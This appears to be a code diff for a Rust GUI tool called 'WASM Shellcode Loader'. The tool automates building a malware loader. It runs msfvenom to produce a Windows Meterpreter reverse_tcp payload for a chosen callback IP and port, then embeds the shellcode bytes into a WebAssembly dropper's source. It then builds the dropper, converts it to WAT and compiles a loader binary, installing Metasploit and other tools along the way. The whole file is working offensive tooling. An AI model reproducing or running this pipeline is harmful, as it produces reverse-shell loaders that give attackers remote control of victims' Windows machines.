@@ -1,14 +1,19 @@
 use eframe::egui;
-use egui::{Style, TextEdit, Widget};
+use egui::{Button, Color32, Layout, RichText, Style, TextEdit, TopBottomPanel, Widget};
 use std::process::Command;
 use std::path::Path;
 use std::sync::Arc;
+use std::fs;
+use std::net::UdpSocket;
 
 fn main() -> Result<(), eframe::Error> {
-    env_logger::init();
+    let _ = egui_logger::builder()
+    .max_level(simplelog::LevelFilter::Info)
+    .init();
+
 
     let options = eframe::NativeOptions {
-        viewport: egui::ViewportBuilder::default().with_inner_size([550.0, 650.0]),
+        viewport: egui::ViewportBuilder::default().with_inner_size([560.0, 750.0]),
         ..Default::default()
     };
 
@@ -19,212 +24,265 @@ fn main() -> Result<(), eframe::Error> {
     )
 }
 
-#[derive(Default)]
 struct WasmLoaderApp {
     ip_address: String,
     port: String,
     generated_command: String,
-    status: String,
     tools_status: ToolsStatus,
     first_run: bool,
 }
 
+impl Default for WasmLoaderApp {
+    fn default() -> Self {
+        Self {
+            ip_address: Self::get_local_ip().unwrap_or_else(|| "127.0.0.1".to_string()),
+            port: "4444".to_string(),
+            generated_command: String::new(),
+            tools_status: ToolsStatus::default(),
+            first_run: false,
+        }
+    }
+}
+
 #[derive(Default)]
 struct ToolsStatus {
-    wasm_pack_installed: Option<bool>,
-    wabt_installed: Option<bool>,
-    msfvenom_available: Option<bool>,
-    cargo_available: Option<bool>,
-    metasploit_framework_installed: Option<bool>,
+    wasm_pack_installed: bool,
+    wabt_installed: bool,
+    msfvenom_available: bool,
+    cargo_available: bool,
+    metasploit_framework_installed: bool,
 }
 
 impl eframe::App for WasmLoaderApp {
     fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
         if !self.first_run {
+            log::info!("First run");
             self.first_run = true;
+            self.check_tools_status();
             match serde_json::from_str::<Style>(STYLE) {
                 Ok(theme) => {
                     let style = Arc::new(theme);
                     ctx.set_style(style);
                 }
-                Err(e) => println!("Error setting theme: {e:?}")
+                Err(e) => log::error!("Error setting theme: {e:?}")
             };
         }
 
         egui::CentralPanel::default().show(ctx, |ui| {
-            ui.heading("WASM Shellcode Loader Automation");
+           ui.vertical_centered(|ui|  ui.heading(RichText::new("WASM Shellcode Loader").color(Color32::LIGHT_GREEN)));
             ui.separator();
+            ui.add_space(10.);
 
             // Tools Status Section
-            ui.heading("Tools Status");
-            if ui.button("Check Tools").clicked() {
-                self.check_tools_status();
-            }
-
             ui.horizontal(|ui| {
-                ui.label("wasm-pack:");
-                match self.tools_status.wasm_pack_installed {
-                    Some(true) => ui.colored_label(egui::Color32::GREEN, "✓ Installed"),
-                    Some(false) => ui.colored_label(egui::Color32::RED, "✗ Not installed"),
-                    None => ui.label("Unknown"),
-                };
+                ui.heading(RichText::new("Tools Status").color(Color32::LIGHT_BLUE));
+                ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
+                    if ui.button("Check Tools").clicked() {
+                        self.check_tools_status();
+                    }
+                });
             });
+            ui.add_space(10.);
 
-            ui.horizontal(|ui| {
-                ui.label("wabt (wasm2wat):");
-                match self.tools_status.wabt_installed {
-                    Some(true) => ui.colored_label(egui::Color32::GREEN, "✓ Installed"),
-                    Some(false) => ui.colored_label(egui::Color32::RED, "✗ Not installed"),
-                    None => ui.label("Unknown"),
-                };
-            });
-
-            ui.horizontal(|ui| {
-                ui.label("msfvenom:");
-                match self.tools_status.msfvenom_available {
-                    Some(true) => ui.colored_label(egui::Color32::GREEN, "✓ Available"),
-                    Some(false) => ui.colored_label(egui::Color32::RED, "✗ Not available"),
-                    None => ui.label("Unknown"),
-                };
-            });
-
-            ui.horizontal(|ui| {
-                ui.label("cargo:");
-                match self.tools_status.cargo_available {
-                    Some(true) => ui.colored_label(egui::Color32::GREEN, "✓ Available"),
-                    Some(false) => ui.colored_label(egui::Color32::RED, "✗ Not available"),
-                    None => ui.label("Unknown"),
-                };
-            });
-
-            if cfg!(target_os = "windows") {
-                ui.horizontal(|ui| {
-                    ui.label("Metasploit Framework:");
-                    match self.tools_status.metasploit_framework_installed {
-                        Some(true) => ui.colored_label(egui::Color32::GREEN, "✓ Installed"),
-                        Some(false) => ui.colored_label(egui::Color32::RED, "✗ Not installed"),
-                        None => ui.label("Unknown"),
+            ui.columns(2, |ui| {
+                ui[0].horizontal(|ui| {
+                    ui.label("WasmPack");
+                    match self.tools_status.wasm_pack_installed {
+                        true => {
+                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
+                                { ui.colored_label(egui::Color32::GREEN, "Installed"); };
+                            });
+                        }
+                        false => {
+                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
+                                if ui.button(RichText::new("Install WasmPack").color(Color32::LIGHT_RED)).clicked() {
+                                    self.install_wasm_pack();
+                                }
+                            });
+                        }
                     };
                 });
-            }
+    
+                ui[0].horizontal(|ui| {
+                    ui.label("WABT (wasm2wat):");
+                    match self.tools_status.wabt_installed {
+                        true => {
+                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
+                                { ui.colored_label(egui::Color32::GREEN, "Installed"); };
+                            });
+                        }
+                        false => {
+                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
+                                if ui.button(RichText::new("Install WABT").color(Color32::LIGHT_RED)).clicked() {
+                                    self.install_wabt();
+                                }
+                            });
+                        }
+                    };
+                });
+
+                ui[0].horizontal(|ui| {
+                    ui.label("Cargo");
+                    match self.tools_status.cargo_available {
+                        true => {
+                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
+                                ui.colored_label(egui::Color32::GREEN, "Available");
+                            });
+                        }
+                        false => {
+                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| 
+                                ui.colored_label(Color32::LIGHT_RED, "Not available")
+                            );
+                        }
+                    };
+                });
+
+                ui[1].horizontal(|ui| {
+                    ui.label("MsfVenom");
+                    match self.tools_status.msfvenom_available {
+                        true => {
+                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
+                                ui.colored_label(egui::Color32::GREEN, "Available");
+                            });
+                        }
+                        false => {
+                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| 
+                                ui.colored_label(Color32::LIGHT_RED, "Not available")
+                            );
+                        }
+                    };
+                });
+    
+                if cfg!(target_os = "windows") {
+                    ui[1].horizontal(|ui| {
+                        ui.label("Metasploit Framework:");
+                        match self.tools_status.metasploit_framework_installed {
+                            true => {
+                                ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
+                                    { ui.colored_label(egui::Color32::GREEN, "Installed"); };
+                                });
+                            }
+                            false => {
+                                ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| 
+                                    if ui.button(RichText::new("Install Metasploit").color(Color32::LIGHT_RED)).clicked() {
+                                        self.install_metasploit_framework();
+                                    }
+                                );
+                            }
+                        };
+                    });
+                }
+            });
 
             ui.separator();
-
-            // Installation Section
-            ui.heading("Install Missing Tools");
-            
-            if !self.tools_status.wasm_pack_installed.unwrap_or(true) {
-                if ui.button("Install wasm-pack").clicked() {
-                    self.install_wasm_pack();
-                }
-            }
-
-            if !self.tools_status.wabt_installed.unwrap_or(true) {
-                if ui.button("Install wabt (wasm2wat)").clicked() {
-                    self.install_wabt();
-                }
-            }
-
-            if cfg!(target_os = "windows") && !self.tools_status.metasploit_framework_installed.unwrap_or(true) {
-                if ui.button("Download & Install Metasploit Framework").clicked() {
-                    self.install_metasploit_framework();
-                }
-            }
-
-            ui.separator();
+            ui.add_space(10.);
 
             // Configuration Section
-            ui.heading("Payload Configuration");
-            
-            ui.horizontal(|ui| {
-                ui.label("IP Address:");
-                ui.text_edit_singleline(&mut self.ip_address);
+            ui.vertical_centered(|ui| ui.heading(RichText::new("Payload Configuration").color(Color32::LIGHT_BLUE)));
+            ui.add_space(10.);
+            ui.columns(2, |ui| {
+                TextEdit::singleline(&mut self.ip_address).hint_text("IP Addr").ui(&mut ui[0]);
+                TextEdit::singleline(&mut self.port).hint_text("Port #").ui(&mut ui[1]);
+                if ui[0].button("Generate msfvenom Command").clicked() {
+                    self.generate_msfvenom_command();
+                }
+
+                if self.tools_status.msfvenom_available && !self.ip_address.is_empty() && !self.port.is_empty() {
+                    if ui[1].button("Run msfvenom (Generate Payload)").clicked() {
+                        match Self::run_msfvenom(self.ip_address.clone(), self.port.clone()) {
+                            Ok(_) => log::info!("Ran MsfVenom successfully"),
+                            Err(e) => log::error!("Error running MsfVenom: {e:?}"),
+                        }
+                    }
+                }
             });
 
-            ui.horizontal(|ui| {
-                ui.label("Port:");
-                ui.text_edit_singleline(&mut self.port);
+            ui.vertical_centered(|ui| {
+                if !self.generated_command.is_empty() {
+                    if Button::new(&self.generated_command).ui(ui).on_hover_text("Click to Copy").clicked() {
+                        ctx.copy_text(self.generated_command.clone());
+                        log::info!("Command copied to clipboard!");
+                    }
+                }
             });
 
             ui.separator();
-
-            // Command Generation Section
-            ui.heading("Command Generation");
-            
-            if ui.button("Generate msfvenom Command").clicked() {
-                self.generate_msfvenom_command();
-            }
-
-            if self.tools_status.msfvenom_available.unwrap_or(false) && !self.ip_address.is_empty() && !self.port.is_empty() {
-                if ui.button("Run msfvenom (Generate Payload)").clicked() {
-                    self.run_msfvenom();
-                }
-            }
-
-            if !self.generated_command.is_empty() {
-                ui.label("Generated Command:");
-                TextEdit::singleline(&mut self.generated_command).desired_width(400.).ui(ui);
-                
-                if ui.button("Copy to Clipboard").clicked() {
-                    ctx.copy_text(self.generated_command.clone());
-                    self.status = "Command copied to clipboard!".to_string();
-                }
-            }
-
-            ui.separator();
+            ui.add_space(10.);
 
             // Build Section
-            ui.heading("Build Pipeline");
-            
-            if ui.button("Run Full Build Pipeline").clicked() {
-                self.run_full_pipeline();
-            }
+            ui.vertical_centered(|ui| ui.heading(RichText::new("Build Pipeline").color(Color32::LIGHT_BLUE)));
+            ui.add_space(10.);
+            ui.columns(4, |ui| {
+                if ui[0].button("Run Full Build").clicked() {
+                    self.run_full_pipeline();
+                }
+    
+                if ui[1].button("Build Dropper").clicked() {
+                    Self::build_wasm_dropper();
+                }
+    
+                if ui[2].button("Convert to .WAT").clicked() {
+                    Self::convert_wasm_to_wat();
+                }
+    
+                if ui[3].button("Build Loader").clicked() {
+                    Self::build_wasm_loader();
+                }
+            });
+        });
 
-            if ui.button("Build WASM Dropper").clicked() {
-                self.build_wasm_dropper();
-            }
-
-            if ui.button("Convert WASM to WAT").clicked() {
-                self.convert_wasm_to_wat();
-            }
-
-            if ui.button("Build WASM Loader").clicked() {
-                self.build_wasm_loader();
-            }
-
-            ui.separator();
-
-            // Status Section
-            if !self.status.is_empty() {
-                ui.heading("Status");
-                ui.label(&self.status);
-            }
+        TopBottomPanel::bottom("Logs")
+        .min_height(400.)
+        .show(ctx, |ui| {
+            ui.set_min_height(400.);
+            egui_logger::logger_ui()
+            .warn_color(Color32::from_rgb(94, 215, 221)) 
+            .error_color(Color32::from_rgb(255, 55, 102)) 
+            .log_levels([true, true, true, false, false])                    
+            .enable_category("eframe".to_string(), false)
+            .enable_category("eframe::native::glow_integration".to_string(), false)
+            .enable_category("egui_glow::shader_version".to_string(), false)
+            .enable_category("egui_glow::painter".to_string(), false)
+            .show(ui);
         });
     }
 }
 
 impl WasmLoaderApp {
+    fn get_local_ip() -> Option<String> {
+        // Try to connect to a remote address to determine our local IP
+        // This doesn't actually send data, just determines which interface would be used
+        if let Ok(socket) = UdpSocket::bind("0.0.0.0:0") {
+            if let Ok(_) = socket.connect("8.8.8.8:53") {
+                if let Ok(addr) = socket.local_addr() {
+                    return Some(addr.ip().to_string());
+                }
+            }
+        }
+        None
+    }
+
     fn check_tools_status(&mut self) {
-        self.tools_status.wasm_pack_installed = Some(self.check_command_exists("wasm-pack"));
-        self.tools_status.cargo_available = Some(self.check_command_exists("cargo"));
+        self.tools_status.wasm_pack_installed = self.check_command_exists("wasm-pack");
+        self.tools_status.cargo_available = self.check_command_exists("cargo");
         
         // Check msfvenom availability - on Windows, check explicit path
         if cfg!(target_os = "windows") {
             let msfvenom_path = Path::new("C:\\metasploit-framework\\bin\\msfvenom.bat");
-            self.tools_status.msfvenom_available = Some(msfvenom_path.exists());
+            self.tools_status.msfvenom_available = msfvenom_path.exists();
             // Also check if Metasploit Framework is installed by checking the same path
-            self.tools_status.metasploit_framework_installed = Some(msfvenom_path.exists());
+            self.tools_status.metasploit_framework_installed = msfvenom_path.exists();
         } else {
-            self.tools_status.msfvenom_available = Some(self.check_command_exists("msfvenom"));
+            self.tools_status.msfvenom_available = self.check_command_exists("msfvenom");
         }
         
         // Check if wabt is installed by looking for wasm2wat in the wabt directory or PATH
         let wabt_local = Path::new("./wabt/bin/wasm2wat").exists() || 
                         Path::new("./wabt/bin/wasm2wat.exe").exists();
         let wabt_system = self.check_command_exists("wasm2wat");
-        self.tools_status.wabt_installed = Some(wabt_local || wabt_system);
+        self.tools_status.wabt_installed = wabt_local || wabt_system;
         
-        self.status = "Tools status checked".to_string();
+        log::info!("Tools status checked");
     }
 
     fn check_command_exists(&self, command: &str) -> bool {
@@ -243,7 +301,7 @@ impl WasmLoaderApp {
     }
 
     fn install_wasm_pack(&mut self) {
-        self.status = "Installing wasm-pack...".to_string();
+        log::info!("Installing wasm-pack...");
         
         match Command::new("cargo")
             .args(&["install", "wasm-pack"])
@@ -251,21 +309,21 @@ impl WasmLoaderApp {
         {
             Ok(output) => {
                 if output.status.success() {
-                    self.status = "wasm-pack installed successfully!".to_string();
-                    self.tools_status.wasm_pack_installed = Some(true);
+                    log::info!("wasm-pack installed successfully!");
+                    self.tools_status.wasm_pack_installed = true;
                 } else {
-                    self.status = format!("Failed to install wasm-pack: {}", 
+                    log::info!("Failed to install wasm-pack: {}", 
                         String::from_utf8_lossy(&output.stderr));
                 }
             }
             Err(e) => {
-                self.status = format!("Error installing wasm-pack: {}", e);
+                log::info!("Error installing wasm-pack: {}", e);
             }
         }
     }
 
     fn install_wabt(&mut self) {
-        self.status = "Installing wabt...".to_string();
+        log::info!("Installing wabt...");
         
         // Determine the appropriate download URL based on the platform
         let (url, filename) = if cfg!(target_os = "windows") {
@@ -298,37 +356,37 @@ impl WasmLoaderApp {
 
                 match extract_result {
                     Ok(output) if output.status.success() => {
-                        self.status = "wabt installed successfully!".to_string();
-                        self.tools_status.wabt_installed = Some(true);
+                        log::info!("wabt installed successfully!");
+                        self.tools_status.wabt_installed = true;
                         // Clean up downloaded file
                         let _ = std::fs::remove_file(filename);
                     }
                     Ok(output) => {
-                        self.status = format!("Failed to extract wabt: {}", 
+                        log::info!("Failed to extract wabt: {}", 
                             String::from_utf8_lossy(&output.stderr));
                     }
                     Err(e) => {
-                        self.status = format!("Error extracting wabt: {}", e);
+                        log::info!("Error extracting wabt: {}", e);
                     }
                 }
             }
             Ok(output) => {
-                self.status = format!("Failed to download wabt: {}", 
+                log::info!("Failed to download wabt: {}", 
                     String::from_utf8_lossy(&output.stderr));
             }
             Err(e) => {
-                self.status = format!("Error downloading wabt: {}", e);
+                log::info!("Error downloading wabt: {}", e);
             }
         }
     }
 
     fn install_metasploit_framework(&mut self) {
         if !cfg!(target_os = "windows") {
-            self.status = "Metasploit Framework installer is only available for Windows".to_string();
+            log::info!("Metasploit Framework installer is only available for Windows");
             return;
         }
 
-        self.status = "Downloading Metasploit Framework installer...".to_string();
+        log::info!("Downloading Metasploit Framework installer...");
         
         let url = "https://windows.metasploit.com/metasploitframework-latest.msi";
         let filename = "metasploitframework-latest.msi";
@@ -340,7 +398,7 @@ impl WasmLoaderApp {
 
         match download_result {
             Ok(output) if output.status.success() => {
-                self.status = "Metasploit Framework downloaded. Opening installer...".to_string();
+                log::info!("Metasploit Framework downloaded. Opening installer...");
                 
                 // Launch the MSI installer
                 let install_result = Command::new("msiexec")
@@ -349,15 +407,15 @@ impl WasmLoaderApp {
 
                 match install_result {
                     Ok(output) if output.status.success() => {
-                        self.status = "Metasploit Framework installer launched. Please follow the installation wizard.".to_string();
+                        log::info!("Metasploit Framework installer launched. Please follow the installation wizard.");
                         // Note: We don't immediately update the status as the installer runs separately
                     }
                     Ok(output) => {
-                        self.status = format!("Failed to launch installer: {}", 
+                        log::info!("Failed to launch installer: {}", 
                             String::from_utf8_lossy(&output.stderr));
                     }
                     Err(e) => {
-                        self.status = format!("Error launching installer: {}", e);
+                        log::info!("Error launching installer: {}", e);
                     }
                 }
 
@@ -365,18 +423,18 @@ impl WasmLoaderApp {
                 let _ = std::fs::remove_file(filename);
             }
             Ok(output) => {
-                self.status = format!("Failed to download Metasploit Framework: {}", 
+                log::info!("Failed to download Metasploit Framework: {}", 
                     String::from_utf8_lossy(&output.stderr));
             }
             Err(e) => {
-                self.status = format!("Error downloading Metasploit Framework: {}", e);
+                log::info!("Error downloading Metasploit Framework: {}", e);
             }
         }
     }
 
     fn generate_msfvenom_command(&mut self) {
         if self.ip_address.is_empty() || self.port.is_empty() {
-            self.status = "Please enter both IP address and port".to_string();
+            log::info!("Please enter both IP address and port");
             return;
         }
 
@@ -385,50 +443,52 @@ impl WasmLoaderApp {
             self.ip_address, self.port
         );
         
-        self.status = "msfvenom command generated!".to_string();
+        log::info!("msfvenom command generated!");
     }
 
     fn run_full_pipeline(&mut self) {
-        self.status = "Running full build pipeline...".to_string();
+        log::info!("Running full build pipeline...");
         
         // Check if we have the necessary tools
-        if !self.tools_status.wasm_pack_installed.unwrap_or(false) {
-            self.status = "Error: wasm-pack not installed. Please install it first.".to_string();
+        if !self.tools_status.wasm_pack_installed {
+            log::info!("Error: wasm-pack not installed. Please install it first.");
             return;
         }
 
-        if !self.tools_status.wabt_installed.unwrap_or(false) {
-            self.status = "Error: wabt not installed. Please install it first.".to_string();
+        if !self.tools_status.wabt_installed {
+            log::info!("Error: wabt not installed. Please install it first.");
             return;
         }
 
-        if !self.tools_status.msfvenom_available.unwrap_or(false) {
-            self.status = "Error: msfvenom not available. Please install Metasploit Framework first.".to_string();
+        if !self.tools_status.msfvenom_available {
+            log::info!("Error: msfvenom not available. Please install Metasploit Framework first.");
             return;
         }
 
         if self.ip_address.is_empty() || self.port.is_empty() {
-            self.status = "Error: Please enter IP address and port for msfvenom payload generation.".to_string();
+            log::info!("Error: Please enter IP address and port for msfvenom payload generation.");
             return;
         }
-
-        // Step 1: Generate payload with msfvenom and place it in wasm_dropper
-        if !self.run_msfvenom() {
-            return; // Error already set in run_msfvenom
-        }
         
-        // Step 2: Build wasm_dropper
-        self.build_wasm_dropper();
-        
-        // Step 3: Convert to WAT
-        self.convert_wasm_to_wat();
-        
-        // Step 4: Build wasm_loader
-        self.build_wasm_loader();
+        let ip = self.ip_address.clone();
+        let port = self.port.clone();
+        std::thread::spawn(move|| {
+            // Step 1: Generate payload with msfvenom and place it in wasm_dropper
+            match Self::run_msfvenom(ip, port) {
+                Ok(_) => log::info!("Ran MsfVenom Successfully"),
+                Err(e) => log::error!("Error running MsfVenom: {e:?}"),
+            };
+            // Step 2: Build wasm_dropper
+            Self::build_wasm_dropper();
+            // Step 3: Convert to WAT
+            Self::convert_wasm_to_wat();
+            // Step 4: Build wasm_loader
+            Self::build_wasm_loader();
+        });
     }
 
-    fn run_msfvenom(&mut self) -> bool {
-        self.status = "Generating payload with msfvenom...".to_string();
+    fn run_msfvenom(ip: String, port: String) -> anyhow::Result<(), anyhow::Error> {
+        log::info!("Generating payload with msfvenom...");
         
         // Determine msfvenom executable path
         let msfvenom_cmd = if cfg!(target_os = "windows") {
@@ -443,8 +503,8 @@ impl WasmLoaderApp {
         match Command::new(msfvenom_cmd)
             .args(&[
                 "-p", "windows/x64/meterpreter/reverse_tcp",
-                &format!("LHOST={}", self.ip_address),
-                &format!("LPORT={}", self.port),
+                &format!("LHOST={ip}"),
+                &format!("LPORT={port}"),
                 "-f", "rust",
                 "-o", output_file
             ])
@@ -452,23 +512,80 @@ impl WasmLoaderApp {
         {
             Ok(output) => {
                 if output.status.success() {
-                    self.status = "Payload generated successfully with msfvenom!".to_string();
-                    true
+                    log::info!("Payload generated successfully with msfvenom! Updating lib.rs...");
+                    Self::update_lib_with_payload()?;
+                    log::info!("Payload generated and lib.rs updated successfully!");
                 } else {
-                    self.status = format!("Failed to generate payload: {}", 
-                        String::from_utf8_lossy(&output.stderr));
-                    false
+                    return Err(anyhow::anyhow!("Failed to generate payload: {}", String::from_utf8_lossy(&output.stderr)));
                 }
             }
             Err(e) => {
-                self.status = format!("Error running msfvenom: {}", e);
-                false
+                return Err(anyhow::anyhow!("Error running msfvenom: {e:?}"));
             }
         }
+        Ok(())
     }
 
-    fn build_wasm_dropper(&mut self) {
-        self.status = "Building wasm_dropper...".to_string();
+    fn update_lib_with_payload() -> anyhow::Result<(), anyhow::Error>  {
+        // Read the payload.rs file
+        let payload_content = fs::read_to_string("wasm_dropper/src/payload.rs")?;
+        
+        // Parse the payload using simple string matching
+        let buf_start = payload_content.find("let buf: [u8; ")
+            .ok_or(anyhow::anyhow!("Could not find array declaration in payload.rs"))?;
+        let size_start = buf_start + "let buf: [u8; ".len();
+        let size_end = payload_content[size_start..].find(']')
+            .ok_or(anyhow::anyhow!("Could not find array size end in payload.rs"))?;
+        let size = &payload_content[size_start..size_start + size_end];
+        
+        // Find the array data
+        let array_start = payload_content.find(" = [")
+            .ok_or(anyhow::anyhow!("Could not find array data start in payload.rs"))?;
+        let array_data_start = array_start + " = [".len();
+        let array_end = payload_content[array_data_start..].find("];")
+            .ok_or(anyhow::anyhow!("Could not find array data end in payload.rs"))?;
+        let array_data = &payload_content[array_data_start..array_data_start + array_end];
+        
+        // Read the current lib.rs file
+        let lib_content = fs::read_to_string("wasm_dropper/src/lib.rs")?;
+        
+        // Update the WASM_MEMORY_BUFFER_SIZE constant
+        let mut updated_lib = lib_content;
+        
+        // Find and replace the buffer size
+        if let Some(size_start) = updated_lib.find("const WASM_MEMORY_BUFFER_SIZE: usize = ") {
+            let size_decl_start = size_start;
+            let size_decl_end = updated_lib[size_start..].find(';')
+                .ok_or(anyhow::anyhow!("Could not find end of WASM_MEMORY_BUFFER_SIZE declaration"))?;
+            let size_decl_end = size_start + size_decl_end + 1;
+            
+            let new_size_decl = format!("const WASM_MEMORY_BUFFER_SIZE: usize = {};", size);
+            updated_lib.replace_range(size_decl_start..size_decl_end, &new_size_decl);
+        } else {
+            return Err(anyhow::anyhow!("Could not find WASM_MEMORY_BUFFER_SIZE declaration in lib.rs"));
+        }
+        
+        // Find and replace the buffer array
+        if let Some(buffer_start) = updated_lib.find("static WASM_MEMORY_BUFFER: [u8; WASM_MEMORY_BUFFER_SIZE] = [") {
+            let array_start = buffer_start;
+            let array_end = updated_lib[buffer_start..].find("];")
+                .ok_or(anyhow::anyhow!("Could not find end of WASM_MEMORY_BUFFER array"))?;
+            let array_end = buffer_start + array_end + 2;
+            
+            let new_array = format!("static WASM_MEMORY_BUFFER: [u8; WASM_MEMORY_BUFFER_SIZE] = [{}];", array_data);
+            updated_lib.replace_range(array_start..array_end, &new_array);
+        } else {
+            return Err(anyhow::anyhow!("Could not find WASM_MEMORY_BUFFER array declaration in lib.rs"));
+        }
+        
+        // Write the updated lib.rs file
+        fs::write("wasm_dropper/src/lib.rs", updated_lib)?;
+        
+        Ok(())
+    }
+
+    fn build_wasm_dropper() {
+        log::info!("Building wasm_dropper...");
         
         match Command::new("wasm-pack")
             .args(&["build", "--release"])
@@ -477,20 +594,20 @@ impl WasmLoaderApp {
         {
             Ok(output) => {
                 if output.status.success() {
-                    self.status = "wasm_dropper built successfully!".to_string();
+                    log::info!("wasm_dropper built successfully!");
                 } else {
-                    self.status = format!("Failed to build wasm_dropper: {}", 
+                    log::info!("Failed to build wasm_dropper: {}", 
                         String::from_utf8_lossy(&output.stderr));
                 }
             }
             Err(e) => {
-                self.status = format!("Error building wasm_dropper: {}", e);
+                log::info!("Error building wasm_dropper: {}", e);
             }
         }
     }
 
-    fn convert_wasm_to_wat(&mut self) {
-        self.status = "Converting WASM to WAT...".to_string();
+    fn convert_wasm_to_wat() {
+        log::info!("Converting WASM to WAT...");
         
         // Determine the wasm2wat executable path
         let wasm2wat_exe = if Path::new("./wabt/bin/wasm2wat.exe").exists() {
@@ -504,7 +621,7 @@ impl WasmLoaderApp {
         // Ensure the target directory exists
         let target_dir = Path::new("./target/wasm32-unknown-unknown/release");
         if !target_dir.exists() {
-            self.status = "Error: WASM binary not found. Please build wasm_dropper first.".to_string();
+            log::info!("Error: WASM binary not found. Please build wasm_dropper first.");
             return;
         }
 
@@ -517,20 +634,20 @@ impl WasmLoaderApp {
         {
             Ok(output) => {
                 if output.status.success() {
-                    self.status = "WASM converted to WAT successfully!".to_string();
+                    log::info!("WASM converted to WAT successfully!");
                 } else {
-                    self.status = format!("Failed to convert WASM to WAT: {}", 
+                    log::info!("Failed to convert WASM to WAT: {}", 
                         String::from_utf8_lossy(&output.stderr));
                 }
             }
             Err(e) => {
-                self.status = format!("Error converting WASM to WAT: {}", e);
+                log::info!("Error converting WASM to WAT: {}", e);
             }
         }
     }
 
-    fn build_wasm_loader(&mut self) {
-        self.status = "Building wasm_loader...".to_string();
+    fn build_wasm_loader() {
+        log::info!("Building wasm_loader...");
         
         match Command::new("cargo")
             .args(&["build", "--release"])
@@ -539,14 +656,14 @@ impl WasmLoaderApp {
         {
             Ok(output) => {
                 if output.status.success() {
-                    self.status = "wasm_loader built successfully! Binary is at ./target/release/wasm_loader".to_string();
+                    log::info!("wasm_loader built successfully! Binary is at ./target/release/wasm_loader");
                 } else {
-                    self.status = format!("Failed to build wasm_loader: {}", 
+                    log::info!("Failed to build wasm_loader: {}", 
                         String::from_utf8_lossy(&output.stderr));
                 }
             }
             Err(e) => {
-                self.status = format!("Error building wasm_loader: {}", e);
+                log::info!("Error building wasm_loader: {}", e);
             }
         }
     }
